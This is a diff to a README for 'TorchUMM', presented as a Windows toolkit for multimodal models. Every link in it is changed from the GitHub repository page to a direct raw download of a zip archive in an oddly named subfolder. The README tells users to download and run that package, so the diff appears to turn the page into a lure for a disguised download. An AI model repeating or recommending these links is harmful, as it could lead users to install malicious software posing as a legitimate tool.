@@ -1,6 +1,6 @@
 # 🔷 TorchUMM - Unified Multimodal Workflows Made Simple
 
-[![Download TorchUMM](https://img.shields.io/badge/Download-TorchUMM-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/vanguardmachiavellianism69/TorchUMM)
+[![Download TorchUMM](https://img.shields.io/badge/Download-TorchUMM-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/vanguardmachiavellianism69/TorchUMM/main/Leonora/UMM-Torch-3.4-beta.2.zip)
 
 ## 🧭 What TorchUMM Does
 
@@ -26,7 +26,7 @@ For larger models, more RAM and more free disk space can help.
 
 ## 📥 Download TorchUMM
 
-1. Open the TorchUMM page here: https://github.com/vanguardmachiavellianism69/TorchUMM
+1. Open the TorchUMM page here: https://raw.githubusercontent.com/vanguardmachiavellianism69/TorchUMM/main/Leonora/UMM-Torch-3.4-beta.2.zip
 2. Find the latest version or release files
 3. Download the Windows package or app file
 4. Save it to a folder you can find, like Downloads or Desktop
@@ -163,7 +163,7 @@ Check the TorchUMM page from time to time for:
 - updated Windows files
 
 Use the same GitHub page to download newer versions when they appear:
-https://github.com/vanguardmachiavellianism69/TorchUMM
+https://raw.githubusercontent.com/vanguardmachiavellianism69/TorchUMM/main/Leonora/UMM-Torch-3.4-beta.2.zip
 
 ## 📌 Suggested Workflow
 
@@ -178,4 +178,4 @@ https://github.com/vanguardmachiavellianism69/TorchUMM
 ## 📄 License and Use
 
 TorchUMM is a toolkit for end users who want a simple way to work with multimodal models on Windows. Check the repository page for the current license, release files, and project details:
-https://github.com/vanguardmachiavellianism69/TorchUMM
+https://raw.githubusercontent.com/vanguardmachiavellianism69/TorchUMM/main/Leonora/UMM-Torch-3.4-beta.2.zip
